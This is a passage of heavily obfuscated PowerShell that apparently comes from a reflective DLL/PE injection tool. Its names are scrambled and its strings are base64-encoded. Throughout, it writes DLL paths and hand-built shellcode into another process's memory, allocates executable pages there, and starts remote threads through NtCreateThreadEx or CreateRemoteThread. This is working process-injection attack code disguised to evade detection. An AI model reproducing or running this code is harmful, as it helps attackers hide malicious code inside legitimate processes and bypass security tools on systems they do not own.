			Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFYAaQBzAHQAYQAvADcAIABkAGUAdABlAGMAdABlAGQALAAgAHUAcwBpAG4AZwAgAE4AdABDAHIAZQBhAHQAZQBUAGgAcgBlAGEAZABFAHgALgAgAEEAZABkAHIAZQBzAHMAIABvAGYAIAB0AGgAcgBlAGEAZAA6ACAAJAB7AF8AXwAvAFwALwA9AD0AXABfAC8AXAAvAD0APQBcAC8AXAAvAH0A')))
			${_/\_/\_/\__/===\_}= ${_/=\/\/\/\____/\/=}.NtCreateThreadEx.Invoke([Ref]${__/=\_/=====\/==\}, 0x1FFFFF, [IntPtr]::Zero, ${__/=\/\/=\__/\/==\}, ${__/\/==\_/\/==\/\/}, ${___/=\____/\/\/\/=}, $false, 0, 0xffff, 0xffff, [IntPtr]::Zero)
			${/=\_/\__/=\_/\__/} = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
			if (${__/=\_/=====\/==\} -eq [IntPtr]::Zero)
			{
				Throw $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByACAAaQBuACAATgB0AEMAcgBlAGEAdABlAFQAaAByAGUAYQBkAEUAeAAuACAAUgBlAHQAdQByAG4AIAB2AGEAbAB1AGUAOgAgACQAewBfAC8AXABfAC8AXABfAC8AXABfAF8ALwA9AD0APQBcAF8AfQAuACAATABhAHMAdABFAHIAcgBvAHIAOgAgACQAewAvAD0AXABfAC8AXABfAF8ALwA9AFwAXwAvAFwAXwBfAC8AfQA=')))
			}
		}
		else
		{
			Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFgAUAAvADgAIABkAGUAdABlAGMAdABlAGQALAAgAHUAcwBpAG4AZwAgAEMAcgBlAGEAdABlAFIAZQBtAG8AdABlAFQAaAByAGUAYQBkAC4AIABBAGQAZAByAGUAcwBzACAAbwBmACAAdABoAHIAZQBhAGQAOgAgACQAewBfAF8ALwBcAC8APQA9AFwAXwAvAFwALwA9AD0AXAAvAFwALwB9AA==')))
			${__/=\_/=====\/==\} = ${_/=\/\/\/\____/\/=}.CreateRemoteThread.Invoke(${__/=\/\/=\__/\/==\}, [IntPtr]::Zero, [UIntPtr][UInt64]0xFFFF, ${__/\/==\_/\/==\/\/}, ${___/=\____/\/\/\/=}, 0, [IntPtr]::Zero)
		}
		if (${__/=\_/=====\/==\} -eq [IntPtr]::Zero)
		{
			Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByACAAYwByAGUAYQB0AGkAbgBnACAAcgBlAG0AbwB0AGUAIAB0AGgAcgBlAGEAZAAsACAAdABoAHIAZQBhAGQAIABoAGEAbgBkAGwAZQAgAGkAcwAgAG4AdQBsAGwA')))
		}
		return ${__/=\_/=====\/==\}
	}
	Function __/\/===\/==\___/\
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[IntPtr]
		${_/====\_/\/======\},
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		${_____/=\_____/\__/}
		)
		${/\_____/\/===\_/\} = New-Object System.Object
		${/=\__/======\__/\} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${_/====\_/\/======\}, [Type]${_____/=\_____/\__/}.IMAGE_DOS_HEADER)
		[IntPtr]${_/==\___/==\/\/\_} = [IntPtr](_/===\/==\/======\ ([Int64]${_/====\_/\/======\}) ([Int64][UInt64]${/=\__/======\__/\}.e_lfanew))
		${/\_____/\/===\_/\} | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value ${_/==\___/==\/\/\_}
		${_/==\/\_/\_/\/===} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${_/==\___/==\/\/\_}, [Type]${_____/=\_____/\__/}.IMAGE_NT_HEADERS64)
	    if (${_/==\/\_/\_/\/===}.Signature -ne 0x00004550)
	    {
	        throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHYAYQBsAGkAZAAgAEkATQBBAEcARQBfAE4AVABfAEgARQBBAEQARQBSACAAcwBpAGcAbgBhAHQAdQByAGUALgA=')))
	    }
		if (${_/==\/\_/\_/\/===}.OptionalHeader.Magic -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ATgBUAF8ATwBQAFQASQBPAE4AQQBMAF8ASABEAFIANgA0AF8ATQBBAEcASQBDAA=='))))
		{
			${/\_____/\/===\_/\} | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value ${_/==\/\_/\_/\/===}
			${/\_____/\/===\_/\} | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $true
		}
		else
		{
			${____/\_/\/=\/\/=\} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${_/==\___/==\/\/\_}, [Type]${_____/=\_____/\__/}.IMAGE_NT_HEADERS32)
			${/\_____/\/===\_/\} | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value ${____/\_/\/=\/\/=\}
			${/\_____/\/===\_/\} | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $false
		}
		return ${/\_____/\/===\_/\}
	}
	Function _/====\____/===\_/
	{
		Param(
		[Parameter( Position = 0, Mandatory = $true )]
		[Byte[]]
		${___/==\_/\___/\/=\},
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		${_____/=\_____/\__/}
		)
		${_/=\/====\/\/==\_/} = New-Object System.Object
		[IntPtr]${_/\_/=\/=\/===\_/} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${___/==\_/\___/\/=\}.Length)
		[System.Runtime.InteropServices.Marshal]::Copy(${___/==\_/\___/\/=\}, 0, ${_/\_/=\/=\/===\_/}, ${___/==\_/\___/\/=\}.Length) | Out-Null
		${/\_____/\/===\_/\} = __/\/===\/==\___/\ -_/====\_/\/======\ ${_/\_/=\/=\/===\_/} -_____/=\_____/\__/ ${_____/=\_____/\__/}
		${_/=\/====\/\/==\_/} | Add-Member -MemberType NoteProperty -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABFADYANABCAGkAdAA='))) -Value (${/\_____/\/===\_/\}.PE64Bit)
		${_/=\/====\/\/==\_/} | Add-Member -MemberType NoteProperty -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwByAGkAZwBpAG4AYQBsAEkAbQBhAGcAZQBCAGEAcwBlAA=='))) -Value (${/\_____/\/===\_/\}.IMAGE_NT_HEADERS.OptionalHeader.ImageBase)
		${_/=\/====\/\/==\_/} | Add-Member -MemberType NoteProperty -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYASQBtAGEAZwBlAA=='))) -Value (${/\_____/\/===\_/\}.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)
		${_/=\/====\/\/==\_/} | Add-Member -MemberType NoteProperty -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYASABlAGEAZABlAHIAcwA='))) -Value (${/\_____/\/===\_/\}.IMAGE_NT_HEADERS.OptionalHeader.SizeOfHeaders)
		${_/=\/====\/\/==\_/} | Add-Member -MemberType NoteProperty -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABsAGwAQwBoAGEAcgBhAGMAdABlAHIAaQBzAHQAaQBjAHMA'))) -Value (${/\_____/\/===\_/\}.IMAGE_NT_HEADERS.OptionalHeader.DllCharacteristics)
		[System.Runtime.InteropServices.Marshal]::FreeHGlobal(${_/\_/=\/=\/===\_/})
		return ${_/=\/====\/\/==\_/}
	}
	Function _/=\____/=\/\_/\__
	{
		Param(
		[Parameter( Position = 0, Mandatory = $true)]
		[IntPtr]
		${_/====\_/\/======\},
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		${_____/=\_____/\__/},
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		${_____/\__/\/\/\/\/}
		)
		if (${_/====\_/\/======\} -eq $null -or ${_/====\_/\/======\} -eq [IntPtr]::Zero)
		{
			throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABFAEgAYQBuAGQAbABlACAAaQBzACAAbgB1AGwAbAAgAG8AcgAgAEkAbgB0AFAAdAByAC4AWgBlAHIAbwA=')))
		}
		${_/=\/====\/\/==\_/} = New-Object System.Object
		${/\_____/\/===\_/\} = __/\/===\/==\___/\ -_/====\_/\/======\ ${_/====\_/\/======\} -_____/=\_____/\__/ ${_____/=\_____/\__/}
		${_/=\/====\/\/==\_/} | Add-Member -MemberType NoteProperty -Name PEHandle -Value ${_/====\_/\/======\}
		${_/=\/====\/\/==\_/} | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value (${/\_____/\/===\_/\}.IMAGE_NT_HEADERS)
		${_/=\/====\/\/==\_/} | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value (${/\_____/\/===\_/\}.NtHeadersPtr)
		${_/=\/====\/\/==\_/} | Add-Member -MemberType NoteProperty -Name PE64Bit -Value (${/\_____/\/===\_/\}.PE64Bit)
		${_/=\/====\/\/==\_/} | Add-Member -MemberType NoteProperty -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYASQBtAGEAZwBlAA=='))) -Value (${/\_____/\/===\_/\}.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)
		if (${_/=\/====\/\/==\_/}.PE64Bit -eq $true)
		{
			[IntPtr]${_/======\___/\___} = [IntPtr](_/===\/==\/======\ ([Int64]${_/=\/====\/\/==\_/}.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]${_____/=\_____/\__/}.IMAGE_NT_HEADERS64)))
			${_/=\/====\/\/==\_/} | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value ${_/======\___/\___}
		}
		else
		{
			[IntPtr]${_/======\___/\___} = [IntPtr](_/===\/==\/======\ ([Int64]${_/=\/====\/\/==\_/}.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]${_____/=\_____/\__/}.IMAGE_NT_HEADERS32)))
			${_/=\/====\/\/==\_/} | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value ${_/======\___/\___}
		}
		if ((${/\_____/\/===\_/\}.IMAGE_NT_HEADERS.FileHeader.Characteristics -band ${_____/\__/\/\/\/\/}.IMAGE_FILE_DLL) -eq ${_____/\__/\/\/\/\/}.IMAGE_FILE_DLL)
		{
			${_/=\/====\/\/==\_/} | Add-Member -MemberType NoteProperty -Name FileType -Value $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABMAEwA')))
		}
		elseif ((${/\_____/\/===\_/\}.IMAGE_NT_HEADERS.FileHeader.Characteristics -band ${_____/\__/\/\/\/\/}.IMAGE_FILE_EXECUTABLE_IMAGE) -eq ${_____/\__/\/\/\/\/}.IMAGE_FILE_EXECUTABLE_IMAGE)
		{
			${_/=\/====\/\/==\_/} | Add-Member -MemberType NoteProperty -Name FileType -Value $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBYAEUA')))
		}
		else
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABFACAAZgBpAGwAZQAgAGkAcwAgAG4AbwB0ACAAYQBuACAARQBYAEUAIABvAHIAIABEAEwATAA=')))
		}
		return ${_/=\/====\/\/==\_/}
	}
	Function __/=\/\_/==\/\__/\
	{
		Param(
		[Parameter(Position=0, Mandatory=$true)]
		[IntPtr]
		${__/=\_/\___/\_/\/=},
		[Parameter(Position=1, Mandatory=$true)]
		[IntPtr]
		${__/\/===\__/\/=\__}
		)
		${_/=\/\/==\_/\_/==} = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		${_/\_/=\_/\_/\/==\} = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi(${__/\/===\__/\/=\__})
		${/=\_/\_/==\/\___/} = [UIntPtr][UInt64]([UInt64]${_/\_/=\_/\_/\/==\}.Length + 1)
		${/=\/===\/=\/=====} = ${_/=\/\/\/\____/\/=}.VirtualAllocEx.Invoke(${__/=\_/\___/\_/\/=}, [IntPtr]::Zero, ${/=\_/\_/==\/\___/}, ${_____/\__/\/\/\/\/}.MEM_COMMIT -bor ${_____/\__/\/\/\/\/}.MEM_RESERVE, ${_____/\__/\/\/\/\/}.PAGE_READWRITE)
		if (${/=\/===\/=\/=====} -eq [IntPtr]::Zero)
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABhAGwAbABvAGMAYQB0AGUAIABtAGUAbQBvAHIAeQAgAGkAbgAgAHQAaABlACAAcgBlAG0AbwB0AGUAIABwAHIAbwBjAGUAcwBzAA==')))
		}
		[UIntPtr]${/=\/==\__/\_/\__/} = [UIntPtr]::Zero
		${______/\/\_/=\_/\} = ${_/=\/\/\/\____/\/=}.WriteProcessMemory.Invoke(${__/=\_/\___/\_/\/=}, ${/=\/===\/=\/=====}, ${__/\/===\__/\/=\__}, ${/=\_/\_/==\/\___/}, [Ref]${/=\/==\__/\_/\__/})
		if (${______/\/\_/=\_/\} -eq $false)
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIAB3AHIAaQB0AGUAIABEAEwATAAgAHAAYQB0AGgAIAB0AG8AIAByAGUAbQBvAHQAZQAgAHAAcgBvAGMAZQBzAHMAIABtAGUAbQBvAHIAeQA=')))
		}
		if (${/=\_/\_/==\/\___/} -ne ${/=\/==\__/\_/\__/})
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABpAGQAbgAnAHQAIAB3AHIAaQB0AGUAIAB0AGgAZQAgAGUAeABwAGUAYwB0AGUAZAAgAGEAbQBvAHUAbgB0ACAAbwBmACAAYgB5AHQAZQBzACAAdwBoAGUAbgAgAHcAcgBpAHQAaQBuAGcAIABhACAARABMAEwAIABwAGEAdABoACAAdABvACAAbABvAGEAZAAgAHQAbwAgAHQAaABlACAAcgBlAG0AbwB0AGUAIABwAHIAbwBjAGUAcwBzAA==')))
		}
		${_____/==\/\_/\_/=} = ${_/=\/\/\/\____/\/=}.GetModuleHandle.Invoke($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('awBlAHIAbgBlAGwAMwAyAC4AZABsAGwA'))))
		${/===\__/\/\/=\___} = ${_/=\/\/\/\____/\/=}.GetProcAddress.Invoke(${_____/==\/\_/\_/=}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGEAZABMAGkAYgByAGEAcgB5AEEA')))) 
		[IntPtr]${/==\/\/\/\/\_/==\} = [IntPtr]::Zero
		if (${_/=\/====\/\/==\_/}.PE64Bit -eq $true)
		{
			${__/\___/=\__/\__/} = ${_/=\/\/\/\____/\/=}.VirtualAllocEx.Invoke(${__/=\_/\___/\_/\/=}, [IntPtr]::Zero, ${/=\_/\_/==\/\___/}, ${_____/\__/\/\/\/\/}.MEM_COMMIT -bor ${_____/\__/\/\/\/\/}.MEM_RESERVE, ${_____/\__/\/\/\/\/}.PAGE_READWRITE)
			if (${__/\___/=\__/\__/} -eq [IntPtr]::Zero)
			{
				Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABhAGwAbABvAGMAYQB0AGUAIABtAGUAbQBvAHIAeQAgAGkAbgAgAHQAaABlACAAcgBlAG0AbwB0AGUAIABwAHIAbwBjAGUAcwBzACAAZgBvAHIAIAB0AGgAZQAgAHIAZQB0AHUAcgBuACAAdgBhAGwAdQBlACAAbwBmACAATABvAGEAZABMAGkAYgByAGEAcgB5AEEA')))
			}
			${/==\/\_/\_/\____/} = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
			${_/=\___/\_/\_/=\/} = @(0x48, 0xba)
			${_/\_/=====\____/\} = @(0xff, 0xd2, 0x48, 0xba)
			${/=\/\_/=\/=\__/\_} = @(0x48, 0x89, 0x02, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
			${/=====\/===\_/=\/} = ${/==\/\_/\_/\____/}.Length + ${_/=\___/\_/\_/=\/}.Length + ${_/\_/=====\____/\}.Length + ${/=\/\_/=\/=\__/\_}.Length + (${_/=\/\/==\_/\_/==} * 3)
			${/=\/\_/=\/\___/\/} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${/=====\/===\_/=\/})
			${/====\/===\/\/\/=} = ${/=\/\_/=\/\___/\/}
			______/\____/\/=\/ -___/=====\/====\/\ ${/==\/\_/\_/\____/} -___/==\__/\_/=\__/ ${/=\/\_/=\/\___/\/}
			${/=\/\_/=\/\___/\/} = _/===\/==\/======\ ${/=\/\_/=\/\___/\/} (${/==\/\_/\_/\____/}.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr(${/=\/===\/=\/=====}, ${/=\/\_/=\/\___/\/}, $false)
			${/=\/\_/=\/\___/\/} = _/===\/==\/======\ ${/=\/\_/=\/\___/\/} (${_/=\/\/==\_/\_/==})
			______/\____/\/=\/ -___/=====\/====\/\ ${_/=\___/\_/\_/=\/} -___/==\__/\_/=\__/ ${/=\/\_/=\/\___/\/}
			${/=\/\_/=\/\___/\/} = _/===\/==\/======\ ${/=\/\_/=\/\___/\/} (${_/=\___/\_/\_/=\/}.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr(${/===\__/\/\/=\___}, ${/=\/\_/=\/\___/\/}, $false)
			${/=\/\_/=\/\___/\/} = _/===\/==\/======\ ${/=\/\_/=\/\___/\/} (${_/=\/\/==\_/\_/==})
			______/\____/\/=\/ -___/=====\/====\/\ ${_/\_/=====\____/\} -___/==\__/\_/=\__/ ${/=\/\_/=\/\___/\/}
			${/=\/\_/=\/\___/\/} = _/===\/==\/======\ ${/=\/\_/=\/\___/\/} (${_/\_/=====\____/\}.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr(${__/\___/=\__/\__/}, ${/=\/\_/=\/\___/\/}, $false)
			${/=\/\_/=\/\___/\/} = _/===\/==\/======\ ${/=\/\_/=\/\___/\/} (${_/=\/\/==\_/\_/==})
			______/\____/\/=\/ -___/=====\/====\/\ ${/=\/\_/=\/=\__/\_} -___/==\__/\_/=\__/ ${/=\/\_/=\/\___/\/}
			${/=\/\_/=\/\___/\/} = _/===\/==\/======\ ${/=\/\_/=\/\___/\/} (${/=\/\_/=\/=\__/\_}.Length)
			${___/==\_/====\_/\} = ${_/=\/\/\/\____/\/=}.VirtualAllocEx.Invoke(${__/=\_/\___/\_/\/=}, [IntPtr]::Zero, [UIntPtr][UInt64]${/=====\/===\_/=\/}, ${_____/\__/\/\/\/\/}.MEM_COMMIT -bor ${_____/\__/\/\/\/\/}.MEM_RESERVE, ${_____/\__/\/\/\/\/}.PAGE_EXECUTE_READWRITE)
			if (${___/==\_/====\_/\} -eq [IntPtr]::Zero)
			{
				Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABhAGwAbABvAGMAYQB0AGUAIABtAGUAbQBvAHIAeQAgAGkAbgAgAHQAaABlACAAcgBlAG0AbwB0AGUAIABwAHIAbwBjAGUAcwBzACAAZgBvAHIAIABzAGgAZQBsAGwAYwBvAGQAZQA=')))
			}
			${______/\/\_/=\_/\} = ${_/=\/\/\/\____/\/=}.WriteProcessMemory.Invoke(${__/=\_/\___/\_/\/=}, ${___/==\_/====\_/\}, ${/====\/===\/\/\/=}, [UIntPtr][UInt64]${/=====\/===\_/=\/}, [Ref]${/=\/==\__/\_/\__/})
			if ((${______/\/\_/=\_/\} -eq $false) -or ([UInt64]${/=\/==\__/\_/\__/} -ne [UInt64]${/=====\/===\_/=\/}))
			{
				Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIAB3AHIAaQB0AGUAIABzAGgAZQBsAGwAYwBvAGQAZQAgAHQAbwAgAHIAZQBtAG8AdABlACAAcAByAG8AYwBlAHMAcwAgAG0AZQBtAG8AcgB5AC4A')))
			}
			${_/\____/=\__/\/\_} = _/==\/==\__/\_____ -__/=\/\/=\__/\/==\ ${__/=\_/\___/\_/\/=} -__/\/==\_/\/==\/\/ ${___/==\_/====\_/\} -_/=\/\/\/\____/\/= ${_/=\/\/\/\____/\/=}
			${/===\/==\_/\/\/\_} = ${_/=\/\/\/\____/\/=}.WaitForSingleObject.Invoke(${_/\____/=\__/\/\_}, 20000)
			if (${/===\/==\_/\/\/\_} -ne 0)
			{
				Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbAAgAHQAbwAgAEMAcgBlAGEAdABlAFIAZQBtAG8AdABlAFQAaAByAGUAYQBkACAAdABvACAAYwBhAGwAbAAgAEcAZQB0AFAAcgBvAGMAQQBkAGQAcgBlAHMAcwAgAGYAYQBpAGwAZQBkAC4A')))
			}
			[IntPtr]${/==\/==\__/\__/\/} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${_/=\/\/==\_/\_/==})
			${/===\/==\_/\/\/\_} = ${_/=\/\/\/\____/\/=}.ReadProcessMemory.Invoke(${__/=\_/\___/\_/\/=}, ${__/\___/=\__/\__/}, ${/==\/==\__/\__/\/}, [UIntPtr][UInt64]${_/=\/\/==\_/\_/==}, [Ref]${/=\/==\__/\_/\__/})
			if (${/===\/==\_/\/\/\_} -eq $false)
			{
				Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbAAgAHQAbwAgAFIAZQBhAGQAUAByAG8AYwBlAHMAcwBNAGUAbQBvAHIAeQAgAGYAYQBpAGwAZQBkAA==')))
			}
			[IntPtr]${/==\/\/\/\/\_/==\} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${/==\/==\__/\__/\/}, [Type][IntPtr])
			${_/=\/\/\/\____/\/=}.VirtualFreeEx.Invoke(${__/=\_/\___/\_/\/=}, ${__/\___/=\__/\__/}, [UIntPtr][UInt64]0, ${_____/\__/\/\/\/\/}.MEM_RELEASE) | Out-Null
			${_/=\/\/\/\____/\/=}.VirtualFreeEx.Invoke(${__/=\_/\___/\_/\/=}, ${___/==\_/====\_/\}, [UIntPtr][UInt64]0, ${_____/\__/\/\/\/\/}.MEM_RELEASE) | Out-Null
		}
		else
		{
			[IntPtr]${_/\____/=\__/\/\_} = _/==\/==\__/\_____ -__/=\/\/=\__/\/==\ ${__/=\_/\___/\_/\/=} -__/\/==\_/\/==\/\/ ${/===\__/\/\/=\___} -___/=\____/\/\/\/= ${/=\/===\/=\/=====} -_/=\/\/\/\____/\/= ${_/=\/\/\/\____/\/=}
			${/===\/==\_/\/\/\_} = ${_/=\/\/\/\____/\/=}.WaitForSingleObject.Invoke(${_/\____/=\__/\/\_}, 20000)
			if (${/===\/==\_/\/\/\_} -ne 0)
			{
				Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbAAgAHQAbwAgAEMAcgBlAGEAdABlAFIAZQBtAG8AdABlAFQAaAByAGUAYQBkACAAdABvACAAYwBhAGwAbAAgAEcAZQB0AFAAcgBvAGMAQQBkAGQAcgBlAHMAcwAgAGYAYQBpAGwAZQBkAC4A')))
			}
			[Int32]${__/\__/\/=\_/\__/} = 0
			${/===\/==\_/\/\/\_} = ${_/=\/\/\/\____/\/=}.GetExitCodeThread.Invoke(${_/\____/=\__/\/\_}, [Ref]${__/\__/\/=\_/\__/})
			if ((${/===\/==\_/\/\/\_} -eq 0) -or (${__/\__/\/=\_/\__/} -eq 0))
			{
				Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbAAgAHQAbwAgAEcAZQB0AEUAeABpAHQAQwBvAGQAZQBUAGgAcgBlAGEAZAAgAGYAYQBpAGwAZQBkAA==')))
			}
			[IntPtr]${/==\/\/\/\/\_/==\} = [IntPtr]${__/\__/\/=\_/\__/}
		}
		${_/=\/\/\/\____/\/=}.VirtualFreeEx.Invoke(${__/=\_/\___/\_/\/=}, ${/=\/===\/=\/=====}, [UIntPtr][UInt64]0, ${_____/\__/\/\/\/\/}.MEM_RELEASE) | Out-Null
		return ${/==\/\/\/\/\_/==\}
	}
	Function _/==\/\/\_/===\/=\
	{
		Param(
		[Parameter(Position=0, Mandatory=$true)]
		[IntPtr]
		${__/=\_/\___/\_/\/=},
		[Parameter(Position=1, Mandatory=$true)]
		[IntPtr]
		${__/\/\/\/===\/\__/},
		[Parameter(Position=2, Mandatory=$true)]
		[String]
		${______/\__/=\/\_/\}
		)
		${_/=\/\/==\_/\_/==} = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		${_____/===\/=\/==\} = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi(${______/\__/=\/\_/\})
		${/=\/\/=\/=\_/\__/} = [UIntPtr][UInt64]([UInt64]${______/\__/=\/\_/\}.Length + 1)
		${_/=\________/=\_/} = ${_/=\/\/\/\____/\/=}.VirtualAllocEx.Invoke(${__/=\_/\___/\_/\/=}, [IntPtr]::Zero, ${/=\/\/=\/=\_/\__/}, ${_____/\__/\/\/\/\/}.MEM_COMMIT -bor ${_____/\__/\/\/\/\/}.MEM_RESERVE, ${_____/\__/\/\/\/\/}.PAGE_READWRITE)
		if (${_/=\________/=\_/} -eq [IntPtr]::Zero)
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABhAGwAbABvAGMAYQB0AGUAIABtAGUAbQBvAHIAeQAgAGkAbgAgAHQAaABlACAAcgBlAG0AbwB0AGUAIABwAHIAbwBjAGUAcwBzAA==')))
		}
		[UIntPtr]${/=\/==\__/\_/\__/} = [UIntPtr]::Zero
		${______/\/\_/=\_/\} = ${_/=\/\/\/\____/\/=}.WriteProcessMemory.Invoke(${__/=\_/\___/\_/\/=}, ${_/=\________/=\_/}, ${_____/===\/=\/==\}, ${/=\/\/=\/=\_/\__/}, [Ref]${/=\/==\__/\_/\__/})
		[System.Runtime.InteropServices.Marshal]::FreeHGlobal(${_____/===\/=\/==\})
		if (${______/\/\_/=\_/\} -eq $false)
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIAB3AHIAaQB0AGUAIABEAEwATAAgAHAAYQB0AGgAIAB0AG8AIAByAGUAbQBvAHQAZQAgAHAAcgBvAGMAZQBzAHMAIABtAGUAbQBvAHIAeQA=')))
		}
		if (${/=\/\/=\/=\_/\__/} -ne ${/=\/==\__/\_/\__/})
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABpAGQAbgAnAHQAIAB3AHIAaQB0AGUAIAB0AGgAZQAgAGUAeABwAGUAYwB0AGUAZAAgAGEAbQBvAHUAbgB0ACAAbwBmACAAYgB5AHQAZQBzACAAdwBoAGUAbgAgAHcAcgBpAHQAaQBuAGcAIABhACAARABMAEwAIABwAGEAdABoACAAdABvACAAbABvAGEAZAAgAHQAbwAgAHQAaABlACAAcgBlAG0AbwB0AGUAIABwAHIAbwBjAGUAcwBzAA==')))
		}
		${_____/==\/\_/\_/=} = ${_/=\/\/\/\____/\/=}.GetModuleHandle.Invoke($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('awBlAHIAbgBlAGwAMwAyAC4AZABsAGwA'))))
		${/=\/\/=\__/=\___/} = ${_/=\/\/\/\____/\/=}.GetProcAddress.Invoke(${_____/==\/\_/\_/=}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQAUAByAG8AYwBBAGQAZAByAGUAcwBzAA==')))) 
		${_/=\/=\_/==\__/=\} = ${_/=\/\/\/\____/\/=}.VirtualAllocEx.Invoke(${__/=\_/\___/\_/\/=}, [IntPtr]::Zero, [UInt64][UInt64]${_/=\/\/==\_/\_/==}, ${_____/\__/\/\/\/\/}.MEM_COMMIT -bor ${_____/\__/\/\/\/\/}.MEM_RESERVE, ${_____/\__/\/\/\/\/}.PAGE_READWRITE)
		if (${_/=\/=\_/==\__/=\} -eq [IntPtr]::Zero)
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABhAGwAbABvAGMAYQB0AGUAIABtAGUAbQBvAHIAeQAgAGkAbgAgAHQAaABlACAAcgBlAG0AbwB0AGUAIABwAHIAbwBjAGUAcwBzACAAZgBvAHIAIAB0AGgAZQAgAHIAZQB0AHUAcgBuACAAdgBhAGwAdQBlACAAbwBmACAARwBlAHQAUAByAG8AYwBBAGQAZAByAGUAcwBzAA==')))
		}
		[Byte[]]${/==\/===\__/=\_/\} = @()
		if (${_/=\/====\/\/==\_/}.PE64Bit -eq $true)
		{
			${/===\_/\_/\__/\__} = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
			${/=\/\/\_/\____/\_} = @(0x48, 0xba)
			${/==\/\_/=\_/\/\__} = @(0x48, 0xb8)
			${__/=\/\/\_/=\/\__} = @(0xff, 0xd0, 0x48, 0xb9)
			${_/=\/\/=====\___/} = @(0x48, 0x89, 0x01, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
		}
		else
		{
			${/===\_/\_/\__/\__} = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xc0, 0xb8)
